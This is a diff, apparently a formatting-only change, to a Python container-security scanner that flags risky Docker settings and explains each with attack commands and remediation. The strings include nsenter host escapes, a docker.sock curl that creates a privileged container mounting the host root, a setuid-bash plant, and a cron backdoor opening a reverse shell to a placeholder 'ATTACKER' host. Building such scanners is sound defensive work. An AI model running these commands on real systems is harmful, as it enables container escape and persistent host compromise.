@@ -64,7 +64,7 @@ def _is_dangerous_mount(source: str, destination: str) -> bool:
 
 def _is_running_as_root(container: ContainerInfo) -> bool:
     """Check if container is running as root user."""
-    user = getattr(container, 'user', None)
+    user = getattr(container, "user", None)
     if user is None:
         return False
     return user in ("root", "0", "")
@@ -98,8 +98,7 @@ def evaluate_container_risks(container: ContainerInfo) -> list[Risk]:
                 attack_explanation=(
                     "An attacker inside this container has full access to all host "
                     "devices and can escape to the host with a single command. "
-                    "Privileged mode disables almost all container isolation."
-                    + root_note
+                    "Privileged mode disables almost all container isolation." + root_note
                 ),
                 attack_commands=[
                     "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
@@ -130,15 +129,14 @@ def evaluate_container_risks(container: ContainerInfo) -> list[Risk]:
                         "An attacker inside this container can control the Docker "
                         "daemon. They can create a new privileged container that "
                         "mounts the host root filesystem, giving them full root "
-                        "access to the host in seconds."
-                        + root_note
+                        "access to the host in seconds." + root_note
                     ),
                     attack_commands=[
                         (
                             "curl --unix-socket /var/run/docker.sock "
                             "http://localhost/v1.41/containers/create "
-                            "-d '{\"Image\":\"alpine\",\"HostConfig\":"
-                            "{\"Privileged\":true,\"Binds\":[\"/:/host\"]}}'"
+                            '-d \'{"Image":"alpine","HostConfig":'
+                            '{"Privileged":true,"Binds":["/:/host"]}}\''
                         ),
                     ],
                     remediation=(
@@ -168,8 +166,7 @@ def evaluate_container_risks(container: ContainerInfo) -> list[Risk]:
                         "An attacker inside this container can mount the host "
                         "filesystem. SYS_ADMIN grants near-root privileges "
                         "including the ability to mount devices, create namespaces, "
-                        "and bypass most container isolation."
-                        + root_note
+                        "and bypass most container isolation." + root_note
                     ),
                     attack_commands=[
                         "mount /dev/sda1 /mnt",
@@ -186,7 +183,7 @@ def evaluate_container_risks(container: ContainerInfo) -> list[Risk]:
             )
 
     # === CRITICAL: Host PID namespace ===
-    pid_mode = getattr(container, 'pid_mode', None)
+    pid_mode = getattr(container, "pid_mode", None)
     if pid_mode and pid_mode in DANGEROUS_NAMESPACE_MODES:
         risks.append(
             Risk(
@@ -197,8 +194,7 @@ def evaluate_container_risks(container: ContainerInfo) -> list[Risk]:
                 attack_explanation=(
                     "An attacker inside this container can see all host processes "
                     "and use nsenter to escape into the host's namespaces. With "
-                    "access to PID 1, they can get a root shell on the host."
-                    + root_note
+                    "access to PID 1, they can get a root shell on the host." + root_note
                 ),
                 attack_commands=[
                     "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
@@ -233,7 +229,11 @@ def evaluate_container_risks(container: ContainerInfo) -> list[Risk]:
             attack_cmds = [
                 f"echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > {dst}/cron.d/backdoor",
             ]
-        elif src in ("/usr/bin", "/usr/sbin") or src.startswith("/usr/bin/") or src.startswith("/usr/sbin/"):
+        elif (
+            src in ("/usr/bin", "/usr/sbin")
+            or src.startswith("/usr/bin/")
+            or src.startswith("/usr/sbin/")
+        ):
             attack_cmds = [
                 f"cp /bin/bash {dst}/evil && chmod +s {dst}/evil",
             ]
@@ -256,8 +256,7 @@ def evaluate_container_risks(container: ContainerInfo) -> list[Risk]:
                     f"An attacker inside this container can write to {src} on "
                     f"the host. Depending on the path, this enables writing cron "
                     f"jobs, modifying system binaries, planting SSH keys, or "
-                    f"other forms of persistent host compromise."
-                    + root_note
+                    f"other forms of persistent host compromise." + root_note
                 ),
                 attack_commands=attack_cmds,
                 remediation=(
@@ -287,8 +286,7 @@ def evaluate_container_risks(container: ContainerInfo) -> list[Risk]:
                     "An attacker inside this container shares the host's network "
                     "stack. They can sniff traffic on all host interfaces, bind to "
                     "any port, access services listening on localhost (databases, "
-                    "admin panels), and ARP spoof other devices on the LAN."
-                    + root_note
+                    "admin panels), and ARP spoof other devices on the LAN." + root_note
                 ),
                 attack_commands=[
                     "tcpdump -i any -w capture.pcap",
@@ -298,7 +296,7 @@ def evaluate_container_risks(container: ContainerInfo) -> list[Risk]:
                     "Replace 'network_mode: host' with bridge networking and "
                     "explicit port mappings:\n"
                     "  ports:\n"
-                    "    - \"8080:8080\"  # Map only the ports you need"
+                    '    - "8080:8080"  # Map only the ports you need'
                 ),
                 details={},
             )
@@ -319,8 +317,7 @@ def evaluate_container_risks(container: ContainerInfo) -> list[Risk]:
                     attack_explanation=(
                         "An attacker inside this container can use ptrace to attach "
                         "to and inject code into other processes. When combined with "
-                        "host PID mode, this enables process injection on the host."
-                        + root_note
+                        "host PID mode, this enables process injection on the host." + root_note
                     ),
                     attack_commands=[
                         "# With host PID mode: inject into host processes",
@@ -337,10 +334,7 @@ def evaluate_container_risks(container: ContainerInfo) -> list[Risk]:
     return risks
 
 
-def filter_risks_with_whitelist(
-        risks: list[Risk],
-        cfg: Optional[dict] = None
-) -> list[Risk]:
+def filter_risks_with_whitelist(risks: list[Risk], cfg: Optional[dict] = None) -> list[Risk]:
     """
     Filter risks based on whitelist configuration.
 
